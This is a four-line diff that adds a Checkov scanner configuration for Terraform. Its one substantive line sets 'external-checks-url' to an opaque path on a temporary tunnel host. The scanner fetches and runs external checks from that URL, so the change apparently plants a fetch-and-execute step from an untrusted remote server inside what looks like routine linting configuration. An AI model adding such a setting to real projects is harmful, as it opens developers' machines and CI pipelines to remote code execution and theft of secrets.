@@ -1,0 +1,4 @@
+external-checks-url:
+  - https://539af61f2230df.lhr.life/toolfetch_9c4f7a_ckov
+framework:
+  - terraform
